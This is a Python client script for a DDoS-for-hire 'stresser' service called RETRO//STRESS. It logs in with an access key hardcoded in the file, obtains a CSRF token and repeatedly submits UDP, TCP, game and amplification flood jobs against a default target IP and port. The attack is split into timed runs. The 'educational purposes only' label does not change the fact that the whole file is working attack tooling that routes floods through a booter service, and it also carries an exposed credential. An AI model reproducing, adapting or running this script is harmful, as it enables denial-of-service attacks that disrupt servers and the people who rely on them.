#!/usr/bin/env python3
"""
RETRO//STRESS Attack Client
Access key embedded in script - For educational purposes only
"""

import requests
import time
import json
import re
import sys
from typing import Optional, Dict, List, Tuple

# ============================================
# ⚙️ CONFIGURATION - YAHAN APNI DETAILS DALO
# ============================================

ACCESS_KEY = "671ef08cd3df40c6a3f6625674715fe882ab91acd0ba4c51a10d143216e664c0"  # Apna access key yahan paste karo

BASE_URL = "https://retrostress.net"

# Default attack settings (optional)
DEFAULT_IP = "20.204.155.49"
DEFAULT_PORT = 17219
DEFAULT_DURATION = 30
DEFAULT_LAYER = "L4"  # L4 ya L7
DEFAULT_METHOD = "UDP"  # UDP, TCP, GAME, BGMI, AMPLIFICATION

# ============================================

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class RetroStressClient:
    def __init__(self):
        self.base_url = BASE_URL
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': self.base_url,
            'Referer': f'{self.base_url}/',
        })
        
        self.auth_token = None
        self.csrf_token = None
        
    def login(self) -> bool:
        """Login using embedded access key"""
        login_url = f"{self.base_url}/Auth/LoginJson"
        
        print(f"[*] Logging in with access key...")
        
        response = self.session.post(
            login_url,
            json={"accessKey": ACCESS_KEY},
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            if 'auth_token' in self.session.cookies:
                self.auth_token = self.session.cookies['auth_token']
                print(f"[✓] Login successful!")
                return True
        
        print(f"[✗] Login failed! Check your access key.")
        return False
    
    def get_csrf_token(self) -> bool:
        """Get CSRF token"""
        panel_url = f"{self.base_url}/panel"
        
        print(f"[*] Getting CSRF token...")
        
        response = self.session.get(panel_url)
        
        if response.status_code == 200:
            for cookie in self.session.cookies:
                if 'Antiforgery' in cookie.name or 'XSRF' in cookie.name:
                    self.csrf_token = cookie.value
                    print(f"[✓] CSRF token found")
                    return True
            
            match = re.search(r'name="__RequestVerificationToken"\s+value="([^"]+)"', response.text)
            if match:
                self.csrf_token = match.group(1)
                print(f"[✓] CSRF token found")
                return True
        
        print(f"[!] No CSRF token found, continuing...")
        return False
    
    def launch_attack(self, ip: str, port: int, duration: int, layer: str = "L4", method: str = "UDP") -> Tuple[bool, Dict]:
        """Launch the actual attack"""
        
        # Try different API endpoints
        endpoints = [
            f"{self.base_url}/api/attack",
            f"{self.base_url}/api/launch",
            f"{self.base_url}/Test/Execute",
            f"{self.base_url}/Attack/Start",
        ]
        
        payload = {
            "ip": ip,
            "port": port,
            "time": duration,
            "layer": layer,
            "method": method,
        }
        
        headers = {'Content-Type': 'application/json'}
        if self.auth_token:
            headers['Authorization'] = f'Bearer {self.auth_token}'
        if self.csrf_token:
            headers['X-CSRF-TOKEN'] = self.csrf_token
        
        for endpoint in endpoints:
            try:
                print(f"[*] Attacking {ip}:{port} for {duration}s...")
                start = time.time()
                
                response = self.session.post(endpoint, json=payload, headers=headers, timeout=duration + 30)
                
                if response.status_code in [200, 202, 204]:
                    print(f"[✓] Attack sent! Response in {time.time()-start:.1f}s")
                    return True, {'success': True}
                    
            except requests.exceptions.Timeout:
                print(f"[✓] Attack running ({duration}s timeout)")
                return True, {'success': True}
            except:
                continue
        
        return False, {'success': False}


def calculate_runs(total_time: int) -> List[int]:
    """Split time into 30-60 second runs"""
    if total_time <= 60:
        return [total_time]
    
    runs = []
    remaining = total_time
    
    while remaining > 0:
        if remaining >= 30:
            run_time = min(60, remaining)
            runs.append(run_time)
            remaining -= run_time
        else:
            runs.append(remaining)
            remaining = 0
    
    return runs


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='RETRO//STRESS Attack Tool')
    parser.add_argument('--ip', '-i', default=DEFAULT_IP, help='Target IP')
    parser.add_argument('--port', '-p', type=int, default=DEFAULT_PORT, help='Target port')
    parser.add_argument('--time', '-t', type=int, default=DEFAULT_DURATION, help='Duration in seconds (min 30)')
    parser.add_argument('--layer', '-l', default=DEFAULT_LAYER, choices=['L4', 'L7'], help='Layer type')
    parser.add_argument('--method', '-m', default=DEFAULT_METHOD, help='Method: UDP/TCP/GAME/BGMI')
    
    args = parser.parse_args()
    
    # Validate time
    if args.time < 30:
        print(f"[!] Time {args.time}s < 30s, using 30s")
        args.time = 30
    
    # Calculate attack runs
    runs = calculate_runs(args.time)
    
    print(f"""
    ╔════════════════════════════════╗
    ║    RETRO//STRESS ATTACK TOOL    ║
    ╠════════════════════════════════╣
    ║ Target:  {args.ip}:{args.port}     ║
    ║ Time:    {args.time}s ({len(runs)} runs)   ║
    ║ Layer:   {args.layer}              ║
    ║ Method:  {args.method}             ║
    ╚════════════════════════════════╝
    """)
    
    # Login and setup
    client = RetroStressClient()
    
    if not client.login():
        print("[✗] Login failed! Check ACCESS_KEY in script.")
        sys.exit(1)
    
    client.get_csrf_token()
    
    # Execute attacks
    success_count = 0
    
    for i, duration in enumerate(runs, 1):
        print(f"\n>>> RUN {i}/{len(runs)} - {duration} seconds <<<")
        
        success, _ = client.launch_attack(
            ip=args.ip,
            port=args.port,
            duration=duration,
            layer=args.layer,
            method=args.method
        )
        
        if success:
            success_count += 1
        
        if i < len(runs):
            print(f"[*] Waiting 2 seconds before next run...")
            time.sleep(2)
    
    # Summary
    print(f"\n{'='*40}")
    print(f"COMPLETED: {success_count}/{len(runs)} runs successful")
    print(f"TOTAL ATTACK TIME: {args.time} seconds")
    print(f"{'='*40}")


if __name__ == "__main__":
    main()
    
